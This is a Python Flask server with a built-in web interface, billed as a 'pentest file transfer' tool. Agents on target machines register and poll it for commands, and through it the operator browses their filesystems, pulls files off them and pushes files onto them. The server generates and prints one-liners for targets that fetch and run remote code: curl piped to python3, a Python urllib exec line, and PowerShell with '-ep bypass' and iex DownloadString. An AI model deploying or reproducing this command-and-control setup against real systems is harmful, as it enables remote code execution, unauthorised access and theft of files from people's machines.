#!/usr/bin/env python3
"""
FileTransfer Server — run on your machine (Machine A).
Serves a WebUI and manages reverse-connected file-transfer clients.

Usage:
    python3 server.py [-p PORT] [--ip YOUR_IP]

Dependencies:
    pip install flask
"""

import argparse, base64, io, json, os, socket, threading, time, uuid
import fcntl, struct
from flask import Flask, Response, jsonify, request, send_file

app = Flask(__name__)

# ── Global state ───────────────────────────────────────────────────────────────
_lock        = threading.Lock()
clients      = {}   # cid -> {id, hostname, os, version, user, cwd, last_seen, connected_at}
cmd_queues   = {}   # cid -> list[{rid, cmd, args}]
result_store = {}   # rid -> result-dict | None
result_events= {}   # rid -> threading.Event

SERVER_HOST  = "0.0.0.0"
SERVER_PORT  = 8888
PUBLIC_IP    = "127.0.0.1"

CLIENT_TIMEOUT = 60   # seconds until a client is considered dead
CMD_TIMEOUT    = 30   # seconds to wait for a command response (30s default, 60s for file ops)


# ── Helpers ────────────────────────────────────────────────────────────────────

def _iface_ip(ifname):
    """Return IPv4 address of a network interface, or None if unavailable."""
    try:
        SIOCGIFADDR = 0x8915
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packed = fcntl.ioctl(s.fileno(), SIOCGIFADDR,
                             struct.pack('256s', ifname[:15].encode()))
        s.close()
        return socket.inet_ntoa(packed[20:24])
    except Exception:
        return None


def detect_ip():
    """
    Priority:
      1. tun0  (HTB / VPN tunnel)
      2. tun1, tun2, ... (other tunnels)
      3. eth0, eth1, wlan0, ... (physical/virtual)
      4. Fallback: outbound UDP route (default gateway interface)
      5. 127.0.0.1
    """
    # 1-2. tun interfaces
    for i in range(8):
        ip = _iface_ip(f"tun{i}")
        if ip:
            return ip

    # 3. Common physical/virtual interfaces
    for iface in ("eth0", "eth1", "ens33", "ens160", "enp0s3", "wlan0"):
        ip = _iface_ip(iface)
        if ip:
            return ip

    # 4. Any remaining interface via routing
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def send_and_wait(client_id, cmd, args, timeout=CMD_TIMEOUT):
    """Queue a command, block until the client replies, return (result, error)."""
    rid = str(uuid.uuid4())
    ev  = threading.Event()
    with _lock:
        if client_id not in cmd_queues:
            return None, "client not found"
        result_store[rid]  = None
        result_events[rid] = ev
        cmd_queues[client_id].append({"rid": rid, "cmd": cmd, "args": args})

    fired = ev.wait(timeout)
    with _lock:
        result = result_store.pop(rid, None)
        result_events.pop(rid, None)

    if not fired:
        return None, f"timeout — client did not respond within {timeout}s"
    return result, None


def prune_loop():
    """Background thread: evict clients that stopped polling."""
    while True:
        time.sleep(15)
        cutoff = time.time() - CLIENT_TIMEOUT
        with _lock:
            dead = [cid for cid, c in clients.items() if c["last_seen"] < cutoff]
            for cid in dead:
                clients.pop(cid, None)
                cmd_queues.pop(cid, None)


# ── Client-facing endpoints (polled by the agent on the target) ────────────────

@app.route("/api/register", methods=["POST"])
def api_register():
    data = request.get_json(force=True) or {}
    cid  = str(uuid.uuid4())
    now  = time.time()
    with _lock:
        clients[cid] = {
            "id":           cid,
            "hostname":     data.get("hostname", "unknown"),
            "os":           data.get("os", "unknown"),
            "version":      data.get("version", ""),
            "user":         data.get("user", "?"),
            "cwd":          data.get("cwd", "/"),
            "last_seen":    now,
            "connected_at": now,
        }
        cmd_queues[cid] = []
    return jsonify({"id": cid})


@app.route("/api/cmd/<cid>")
def api_poll(cid):
    with _lock:
        if cid not in clients:
            return jsonify({"error": "unknown"}), 404
        clients[cid]["last_seen"] = time.time()
        queue = cmd_queues.get(cid, [])
        if queue:
            return jsonify(queue.pop(0))
    return jsonify({"cmd": None})


@app.route("/api/result/<cid>", methods=["POST"])
def api_result(cid):
    data = request.get_json(force=True) or {}
    rid  = data.get("rid")
    with _lock:
        if rid in result_events:
            result_store[rid] = data.get("result")
            result_events[rid].set()
    return jsonify({"ok": True})


# ── Operator-facing endpoints (called by the WebUI) ───────────────────────────

@app.route("/api/clients")
def api_clients():
    now = time.time()
    with _lock:
        lst = [
            {**c, "online": now - c["last_seen"] < 5}
            for c in clients.values()
        ]
    lst.sort(key=lambda c: c["connected_at"])
    return jsonify({"clients": lst})


@app.route("/api/clients/<cid>/ls", methods=["POST"])
def api_ls(cid):
    data   = request.get_json(force=True) or {}
    result, err = send_and_wait(cid, "ls", {"path": data.get("path", ".")})
    if err:
        code = 408 if "timeout" in err else 400
        return jsonify({"ok": False, "error": err}), code
    return jsonify(result)


@app.route("/api/clients/<cid>/get", methods=["POST"])
def api_get(cid):
    data = request.get_json(force=True) or {}
    result, err = send_and_wait(cid, "get", {"path": data.get("path", "")}, timeout=60)
    if err:
        code = 408 if "timeout" in err else 400
        return jsonify({"ok": False, "error": err}), code
    if not result or not result.get("ok"):
        return jsonify(result or {"ok": False, "error": "no result"}), 400
    file_bytes = base64.b64decode(result["data"])
    return send_file(
        io.BytesIO(file_bytes),
        download_name=result.get("name", "file"),
        as_attachment=True,
    )


@app.route("/api/clients/<cid>/put", methods=["POST"])
def api_put(cid):
    data = request.get_json(force=True) or {}
    result, err = send_and_wait(
        cid, "put",
        {"path": data.get("path", ""), "data": data.get("data", "")},
        timeout=60,
    )
    if err:
        code = 408 if "timeout" in err else 400
        return jsonify({"ok": False, "error": err}), code
    return jsonify(result or {"ok": False, "error": "no result"})


@app.route("/api/info")
def api_info():
    base = f"http://{PUBLIC_IP}:{SERVER_PORT}"
    return jsonify({
        "server": base,
        "oneliners": {
            "linux":      f"curl -s {base}/client.py | python3",
            "macos":      f"curl -s {base}/client.py | python3",
            "win_python": f'python -c "import urllib.request;exec(urllib.request.urlopen(\'{base}/client.py\').read().decode())"',
            "win_ps":     f"powershell -ep bypass -c \"iex(New-Object Net.WebClient).DownloadString('{base}/client.ps1')\"",
        },
    })


# ── Serve client scripts (URL injected dynamically) ───────────────────────────

def _serve_script(filename):
    here = os.path.dirname(os.path.abspath(__file__))
    path = os.path.join(here, filename)
    with open(path) as f:
        code = f.read()
    code = code.replace("SERVER_PLACEHOLDER", f"{PUBLIC_IP}:{SERVER_PORT}")
    return Response(code, mimetype="text/plain")


@app.route("/client.py")
def serve_py():
    return _serve_script("client.py")


@app.route("/client.ps1")
def serve_ps1():
    return _serve_script("client.ps1")


# ── WebUI ──────────────────────────────────────────────────────────────────────

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FileTransfer</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Courier New',monospace;background:#0d1117;color:#c9d1d9;height:100vh;display:flex;flex-direction:column;overflow:hidden}

/* ── Header ── */
header{background:#161b22;border-bottom:1px solid #30363d;padding:10px 18px;display:flex;align-items:center;gap:16px;flex-shrink:0}
header h1{font-size:17px;color:#58a6ff;letter-spacing:1px}
header .srv{font-size:11px;color:#8b949e;margin-left:auto}

/* ── Layout ── */
.main{display:flex;flex:1;overflow:hidden}

/* ── Sidebar ── */
.sidebar{width:290px;background:#161b22;border-right:1px solid #30363d;display:flex;flex-direction:column;overflow:hidden;flex-shrink:0}
.sb-section{padding:12px;border-bottom:1px solid #30363d}
.sb-section h2{font-size:10px;text-transform:uppercase;color:#8b949e;letter-spacing:1.2px;margin-bottom:8px}
.sb-clients{flex:0 0 auto;max-height:240px;overflow-y:auto}
.sb-oneliners{flex:1;overflow-y:auto;padding:12px}
.sb-oneliners h2{font-size:10px;text-transform:uppercase;color:#8b949e;letter-spacing:1.2px;margin-bottom:10px}

/* Client cards */
.client-card{padding:8px 10px;border-radius:6px;cursor:pointer;margin-bottom:5px;border:1px solid transparent;transition:background .15s}
.client-card:hover{background:#21262d;border-color:#30363d}
.client-card.active{background:#1a3a6b;border-color:#58a6ff}
.client-card .cname{font-size:13px;color:#e6edf3;font-weight:bold;display:flex;align-items:center;gap:6px}
.client-card .cmeta{font-size:11px;color:#8b949e;margin-top:2px}
.dot{width:7px;height:7px;border-radius:50%;background:#3fb950;flex-shrink:0}
.dot.offline{background:#6e7681}

/* One-liner blocks */
.ol-block{margin-bottom:10px}
.ol-label{font-size:10px;color:#8b949e;margin-bottom:4px}
.ol-code{background:#010409;border:1px solid #30363d;border-radius:4px;padding:7px 9px;font-size:11px;color:#7ee787;word-break:break-all;line-height:1.5}
.ol-copy{margin-top:4px;font-size:10px;background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:2px 8px;border-radius:3px;cursor:pointer}
.ol-copy:hover{background:#30363d}

/* ── File browser ── */
.browser{flex:1;display:flex;flex-direction:column;overflow:hidden}
.brow-header{padding:10px 16px;border-bottom:1px solid #30363d;background:#161b22;display:flex;align-items:center;gap:10px;flex-shrink:0}
.breadcrumb{display:flex;align-items:center;gap:3px;flex:1;flex-wrap:wrap;min-width:0}
.breadcrumb .bc-part{color:#58a6ff;cursor:pointer;font-size:13px;white-space:nowrap}
.breadcrumb .bc-part:hover{text-decoration:underline}
.breadcrumb .bc-sep{color:#484f58;font-size:13px}
.brow-actions{display:flex;gap:7px;flex-shrink:0}
.btn{padding:5px 13px;border-radius:6px;border:1px solid #30363d;cursor:pointer;font-size:12px;font-family:inherit;transition:background .15s}
.btn-secondary{background:#21262d;color:#c9d1d9}
.btn-secondary:hover{background:#30363d}
.btn-primary{background:#238636;border-color:#2ea043;color:#fff}
.btn-primary:hover{background:#2ea043}

/* File table */
.file-table-wrap{flex:1;overflow-y:auto}
table{width:100%;border-collapse:collapse}
thead th{padding:7px 14px;text-align:left;font-size:11px;color:#8b949e;text-transform:uppercase;letter-spacing:.8px;border-bottom:1px solid #21262d;position:sticky;top:0;background:#0d1117;white-space:nowrap}
tbody td{padding:5px 14px;font-size:13px;border-bottom:1px solid #161b22;vertical-align:middle}
tbody tr:hover td{background:#161b22}
.ico{font-size:15px;line-height:1}
.fname{color:#e6edf3}
.fname.dir{color:#58a6ff;cursor:pointer}
.fname.dir:hover{text-decoration:underline}
.fsize{color:#8b949e;white-space:nowrap}
.fdate{color:#8b949e;white-space:nowrap;font-size:11px}
.get-btn{padding:2px 9px;font-size:11px;border-radius:4px;border:1px solid #30363d;background:#21262d;color:#c9d1d9;cursor:pointer;font-family:inherit}
.get-btn:hover{background:#58a6ff;border-color:#58a6ff;color:#0d1117}

/* Empty / loading states */
.state-box{display:flex;flex-direction:column;align-items:center;justify-content:center;flex:1;color:#8b949e;gap:8px;padding:40px}
.state-box h3{color:#6e7681;font-size:16px}
.state-box p{font-size:13px;text-align:center;max-width:380px;line-height:1.6}

/* Drag-over highlight */
.browser.drag-over{outline:2px dashed #58a6ff;outline-offset:-4px}

/* Notifications */
.notif{position:fixed;bottom:20px;right:20px;padding:9px 16px;border-radius:6px;font-size:13px;z-index:999;animation:fadein .2s ease;max-width:340px}
.notif.ok{background:#12261e;border:1px solid #3fb950;color:#3fb950}
.notif.err{background:#2d1212;border:1px solid #f85149;color:#f85149}
.notif.info{background:#12212e;border:1px solid #58a6ff;color:#58a6ff}
@keyframes fadein{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}

/* Upload progress */
.progress-bar{height:2px;background:#58a6ff;transition:width .3s;margin-top:4px;border-radius:2px}

input[type=file]{display:none}
</style>
</head>
<body>
<header>
  <h1>&#9889; FileTransfer</h1>
  <span id="hdr-status" style="font-size:12px;color:#3fb950"></span>
  <span class="srv" id="hdr-srv"></span>
</header>

<div class="main">
  <!-- Sidebar -->
  <div class="sidebar">
    <div class="sb-section sb-clients">
      <h2>Clients (<span id="client-count">0</span>)</h2>
      <div id="client-list"><div style="color:#484f58;font-size:12px">Waiting for connections...</div></div>
    </div>
    <div class="sb-oneliners">
      <h2>One-Liners</h2>
      <div id="oneliners"><div style="color:#484f58;font-size:12px">Loading...</div></div>
    </div>
  </div>

  <!-- Browser panel -->
  <div class="browser" id="browser">
    <div class="state-box">
      <h3>No client connected</h3>
      <p>Run one of the one-liners on the left on a target machine, then click it to browse its filesystem.</p>
    </div>
  </div>
</div>

<input type="file" id="upload-input" multiple>

<script>
// ── State ──────────────────────────────────────────────────────────────────────
const state = { activeId: null, currentPath: null };

// ── Init ──────────────────────────────────────────────────────────────────────
async function init() {
  try {
    const info = await apiFetch('/api/info');
    document.getElementById('hdr-srv').textContent = info.server;
    renderOneliners(info.oneliners);
  } catch(e) { notify('Cannot reach server', 'err'); }
  pollClients();
}

// ── API helpers ────────────────────────────────────────────────────────────────
async function apiFetch(url, opts = {}) {
  const r = await fetch(url, opts);
  if (!r.ok) {
    const t = await r.text();
    let msg = t;
    try { msg = JSON.parse(t).error || t; } catch(_) {}
    throw new Error(msg);
  }
  // If response is a file download, return the Response directly
  const ct = r.headers.get('content-type') || '';
  if (ct.includes('application/octet') || ct.includes('text/plain') && url.endsWith('/get')) return r;
  return r.json();
}

function post(url, body) {
  return apiFetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(body),
  });
}

// ── Clients ───────────────────────────────────────────────────────────────────
async function pollClients() {
  try {
    const data = await apiFetch('/api/clients');
    updateClients(data.clients);
  } catch(_) {}
  setTimeout(pollClients, 2000);
}

function updateClients(list) {
  document.getElementById('client-count').textContent = list.length;
  const el = document.getElementById('client-list');

  if (list.length === 0) {
    el.innerHTML = '<div style="color:#484f58;font-size:12px">Waiting for connections...</div>';
    document.getElementById('hdr-status').textContent = '';
    return;
  }

  document.getElementById('hdr-status').textContent =
    list.filter(c => c.online).length + ' online';

  // Auto-select first client if none selected
  if (!state.activeId && list.length > 0) selectClient(list[0]);

  el.innerHTML = '';
  list.forEach(c => {
    const div = document.createElement('div');
    div.className = 'client-card' + (c.id === state.activeId ? ' active' : '');
    div.innerHTML =
      `<div class="cname"><span class="dot ${c.online ? '' : 'offline'}"></span>${esc(c.hostname)}</div>` +
      `<div class="cmeta">${esc(c.user)}@${esc(c.os)}  &mdash;  ${timeSince(c.last_seen)}</div>`;
    div.onclick = () => selectClient(c);
    el.appendChild(div);
  });
}

function selectClient(c) {
  state.activeId    = c.id;
  state.currentPath = c.cwd;
  browseTo(c.cwd);
}

// ── One-liners ────────────────────────────────────────────────────────────────
function renderOneliners(ol) {
  const labels = {
    linux:      'Linux / macOS',
    win_python: 'Windows — Python',
    win_ps:     'Windows — PowerShell only',
  };
  const container = document.getElementById('oneliners');
  container.innerHTML = '';
  Object.entries(labels).forEach(([key, label]) => {
    const code = ol[key] || '';
    const div = document.createElement('div');
    div.className = 'ol-block';
    div.innerHTML =
      `<div class="ol-label">${label}</div>` +
      `<div class="ol-code" id="ol-${key}"></div>` +
      `<button class="ol-copy" data-key="${key}">Copy</button>`;
    div.querySelector('.ol-code').textContent = code;
    div.querySelector('.ol-copy').onclick = () => {
      navigator.clipboard.writeText(code).then(() => notify('Copied!', 'info'));
    };
    container.appendChild(div);
  });
}

// ── File Browser ──────────────────────────────────────────────────────────────
async function browseTo(path) {
  if (!state.activeId) return;
  state.currentPath = path;
  showLoading(path);
  try {
    const data = await post(`/api/clients/${state.activeId}/ls`, { path });
    if (data.ok) {
      state.currentPath = data.path;
      renderBrowser(data.path, data.entries);
    } else {
      notify('Error: ' + data.error, 'err');
      renderBrowser(path, null, data.error);
    }
  } catch(e) {
    notify(e.message || 'Connection error', 'err');
    renderBrowser(path, null, e.message);
  }
}

function showLoading(path) {
  const b = document.getElementById('browser');
  b.innerHTML =
    `<div class="brow-header"><div class="breadcrumb">${buildBreadcrumb(path)}</div>` +
    `<div class="brow-actions"><span style="color:#8b949e;font-size:12px">Loading...</span></div></div>` +
    `<div class="state-box"><p style="color:#8b949e">Fetching directory listing...</p></div>`;
  attachBreadcrumbEvents(b);
}

function renderBrowser(path, entries, errMsg) {
  const b = document.getElementById('browser');

  // Header
  const hdr = document.createElement('div');
  hdr.className = 'brow-header';
  hdr.innerHTML =
    `<div class="breadcrumb">${buildBreadcrumb(path)}</div>` +
    `<div class="brow-actions">` +
    `<button class="btn btn-secondary" id="btn-refresh">&#8635; Refresh</button>` +
    `<button class="btn btn-primary" id="btn-upload">&#8679; Upload</button>` +
    `</div>`;

  b.innerHTML = '';
  b.appendChild(hdr);
  attachBreadcrumbEvents(b);
  b.querySelector('#btn-refresh').onclick = () => browseTo(path);
  b.querySelector('#btn-upload').onclick  = () => triggerUpload(path);

  if (errMsg || entries === null) {
    const box = document.createElement('div');
    box.className = 'state-box';
    box.innerHTML = `<h3>Error</h3><p>${esc(errMsg || 'Unknown error')}</p>`;
    b.appendChild(box);
    return;
  }

  // Table
  const wrap = document.createElement('div');
  wrap.className = 'file-table-wrap';
  const table = document.createElement('table');
  table.innerHTML =
    `<thead><tr><th></th><th>Name</th><th>Size</th><th>Modified</th><th></th></tr></thead>`;
  const tbody = document.createElement('tbody');

  // Parent row
  const parent = parentPath(path);
  if (parent !== null) {
    const tr = makeRow('📁', '..', 'dir', '', '');
    tr.querySelector('.fname').onclick = () => browseTo(parent);
    tbody.appendChild(tr);
  }

  if (entries.length === 0 && parent === null) {
    const tr = document.createElement('tr');
    tr.innerHTML = '<td colspan="5" style="text-align:center;padding:20px;color:#484f58">Empty directory</td>';
    tbody.appendChild(tr);
  }

  entries.forEach(e => {
    const fullPath = joinPath(path, e.name);
    const size  = e.type === 'dir' ? '—' : fmtSize(e.size);
    const date  = e.mtime ? new Date(e.mtime * 1000).toLocaleDateString() : '—';
    const icon  = e.type === 'dir' ? '📁' : fileIcon(e.name);
    const tr    = makeRow(icon, e.name, e.type, size, date);

    if (e.type === 'dir') {
      tr.querySelector('.fname').onclick = () => browseTo(fullPath);
    } else {
      const btn = document.createElement('button');
      btn.className = 'get-btn';
      btn.textContent = 'GET';
      btn.onclick = () => downloadFile(fullPath, e.name);
      tr.querySelector('td:last-child').appendChild(btn);
    }
    tbody.appendChild(tr);
  });

  table.appendChild(tbody);
  wrap.appendChild(table);
  b.appendChild(wrap);

  // Drag-and-drop support
  setupDragDrop(b, path);
}

function makeRow(icon, name, type, size, date) {
  const tr = document.createElement('tr');
  const tdIco  = document.createElement('td'); tdIco.innerHTML  = `<span class="ico">${icon}</span>`;
  const tdName = document.createElement('td'); tdName.innerHTML = `<span class="fname ${type === 'dir' ? 'dir' : ''}">${esc(name)}</span>`;
  const tdSize = document.createElement('td'); tdSize.className = 'fsize'; tdSize.textContent = size;
  const tdDate = document.createElement('td'); tdDate.className = 'fdate'; tdDate.textContent = date;
  const tdAct  = document.createElement('td');
  [tdIco, tdName, tdSize, tdDate, tdAct].forEach(td => tr.appendChild(td));
  return tr;
}

// ── Breadcrumb ────────────────────────────────────────────────────────────────
function buildBreadcrumb(path) {
  // Detect Windows by backslash OR a leading drive letter (handles bare "C:" with no slashes yet)
  const isWin = /^[A-Za-z]:/.test(path) || path.includes('\\');
  const parts = path.replace(/[\/\\]+$/, '').split(/[\/\\]/).filter((p, i) => p || i === 0);

  let html = '';
  let cum  = '';

  if (!isWin) {
    // Unix: always start from /
    html += `<span class="bc-part" data-path="/">/</span>`;
    parts.forEach((p, i) => {
      if (!p && i === 0) return; // skip leading empty
      cum += '/' + p;
      const cp = cum;
      html += `<span class="bc-sep">/</span><span class="bc-part" data-path="${esc(cp)}">${esc(p)}</span>`;
    });
  } else {
    // Windows: C:\Users\...
    // Drive root always gets a trailing backslash so isWin stays true on click (C:\ not C:)
    parts.forEach((p, i) => {
      if (i === 0) { cum = p + '\\'; }
      else { cum = cum.replace(/\\$/, '') + '\\' + p; }
      const cp = cum;
      if (i > 0) html += `<span class="bc-sep">\\</span>`;
      html += `<span class="bc-part" data-path="${esc(cp)}">${esc(p)}</span>`;
    });
  }
  return html;
}

function attachBreadcrumbEvents(container) {
  container.querySelectorAll('.bc-part[data-path]').forEach(el => {
    el.onclick = () => browseTo(el.dataset.path);
  });
}

// ── Download ──────────────────────────────────────────────────────────────────
async function downloadFile(path, name) {
  notify(`Fetching ${name} from target...`, 'info');
  try {
    const r = await fetch(`/api/clients/${state.activeId}/get`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ path }),
    });
    if (!r.ok) {
      const d = await r.json();
      notify('Error: ' + (d.error || r.statusText), 'err');
      return;
    }
    const blob = await r.blob();
    const url  = URL.createObjectURL(blob);
    const a    = document.createElement('a');
    a.href = url; a.download = name; a.click();
    URL.revokeObjectURL(url);
    notify(`Downloaded: ${name}`, 'ok');
  } catch(e) {
    notify('Download failed: ' + e.message, 'err');
  }
}

// ── Upload ────────────────────────────────────────────────────────────────────
let uploadTargetDir = null;

function triggerUpload(dir) {
  uploadTargetDir = dir;
  document.getElementById('upload-input').click();
}

document.getElementById('upload-input').addEventListener('change', async e => {
  const files = Array.from(e.target.files);
  e.target.value = '';
  for (const file of files) await uploadFile(file, uploadTargetDir);
});

async function uploadFile(file, dir) {
  notify(`Uploading ${file.name}...`, 'info');
  try {
    const b64  = await fileToBase64(file);
    const dest = joinPath(dir, file.name);
    const data = await post(`/api/clients/${state.activeId}/put`, { path: dest, data: b64 });
    if (data.ok) {
      notify(`Uploaded: ${file.name}`, 'ok');
      browseTo(state.currentPath); // refresh
    } else {
      notify(`Upload failed: ${data.error}`, 'err');
    }
  } catch(e) {
    notify(`Upload failed: ${e.message}`, 'err');
  }
}

function fileToBase64(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = e => {
      const buf   = e.target.result;
      const bytes = new Uint8Array(buf);
      let bin = '', chunk = 8192;
      for (let i = 0; i < bytes.length; i += chunk) {
        bin += String.fromCharCode(...bytes.subarray(i, i + chunk));
      }
      resolve(btoa(bin));
    };
    reader.onerror = reject;
    reader.readAsArrayBuffer(file);
  });
}

// ── Drag-and-drop upload ───────────────────────────────────────────────────────
function setupDragDrop(el, dir) {
  el.addEventListener('dragover', e => { e.preventDefault(); el.classList.add('drag-over'); });
  el.addEventListener('dragleave', () => el.classList.remove('drag-over'));
  el.addEventListener('drop', async e => {
    e.preventDefault();
    el.classList.remove('drag-over');
    const files = Array.from(e.dataTransfer.files);
    for (const f of files) await uploadFile(f, dir);
  });
}

// ── Path helpers ──────────────────────────────────────────────────────────────
function joinPath(base, name) {
  const isWin = base.includes('\\');
  return base.replace(/[\/\\]+$/, '') + (isWin ? '\\' : '/') + name;
}

function parentPath(path) {
  const p = path.replace(/[\/\\]+$/, '');
  if (!p || p === '/') return null;
  if (/^[A-Za-z]:$/.test(p)) return null;       // Windows drive root
  const last = Math.max(p.lastIndexOf('/'), p.lastIndexOf('\\'));
  if (last <= 0) return p.startsWith('/') ? '/' : null;
  if (last === 2 && p[1] === ':') return p.slice(0, 3); // C:\ parent
  return p.slice(0, last) || '/';
}

// ── Misc helpers ──────────────────────────────────────────────────────────────
function fmtSize(n) {
  if (n < 1024) return n + ' B';
  if (n < 1048576) return (n/1024).toFixed(1) + ' KB';
  if (n < 1073741824) return (n/1048576).toFixed(1) + ' MB';
  return (n/1073741824).toFixed(1) + ' GB';
}

function timeSince(ts) {
  const d = Math.floor(Date.now()/1000 - ts);
  if (d < 5)  return 'active';
  if (d < 60) return d + 's ago';
  if (d < 3600) return Math.floor(d/60) + 'm ago';
  return Math.floor(d/3600) + 'h ago';
}

function fileIcon(name) {
  const ext = (name.split('.').pop() || '').toLowerCase();
  const icons = {
    pdf:'📄', txt:'📝', py:'🐍', sh:'📜', ps1:'📜',
    jpg:'🖼', jpeg:'🖼', png:'🖼', gif:'🖼',
    zip:'📦', gz:'📦', tar:'📦', '7z':'📦',
    exe:'⚙️', dll:'⚙️', so:'⚙️',
    key:'🔑', pem:'🔑', ppk:'🔑', pfx:'🔑',
    db:'🗄️', sqlite:'🗄️',
    json:'📋', xml:'📋', yaml:'📋', yml:'📋',
    conf:'⚙️', cfg:'⚙️', ini:'⚙️',
  };
  return icons[ext] || '📄';
}

function esc(s) {
  return String(s)
    .replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function notify(msg, type) {
  const el = document.createElement('div');
  el.className = `notif ${type}`;
  el.textContent = msg;
  document.body.appendChild(el);
  setTimeout(() => el.remove(), 3500);
}

init();
</script>
</body>
</html>"""


@app.route("/")
def index():
    return Response(HTML, mimetype="text/html")


# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    global PUBLIC_IP, SERVER_PORT, SERVER_HOST

    parser = argparse.ArgumentParser(description="FileTransfer — seamless pentest file transfer")
    parser.add_argument("-p", "--port", type=int, default=8888,    help="Listen port (default: 8888)")
    parser.add_argument("-b", "--bind", default="0.0.0.0",         help="Bind address (default: 0.0.0.0)")
    parser.add_argument("--ip",         default=None,              help="Override public IP shown in one-liners")
    args = parser.parse_args()

    SERVER_PORT = args.port
    SERVER_HOST = args.bind
    PUBLIC_IP   = args.ip or detect_ip()

    threading.Thread(target=prune_loop, daemon=True).start()

    base = f"http://{PUBLIC_IP}:{SERVER_PORT}"
    print(f"\n  ⚡  FileTransfer Server")
    print(f"  {'─'*46}")
    print(f"  WebUI    →  {base}/")
    print(f"\n  One-liners (copy-paste on target machines):\n")
    print(f"  [Linux/macOS]")
    print(f"    curl -s {base}/client.py | python3\n")
    print(f"  [Windows — Python]")
    print(f"    python -c \"import urllib.request;exec(urllib.request.urlopen('{base}/client.py').read().decode())\"\n")
    print(f"  [Windows — PowerShell only]")
    print(f"    powershell -ep bypass -c \"iex(New-Object Net.WebClient).DownloadString('{base}/client.ps1')\"\n")
    print(f"  {'─'*46}\n")

    app.run(host=SERVER_HOST, port=SERVER_PORT, debug=False, threaded=True)


if __name__ == "__main__":
    main()
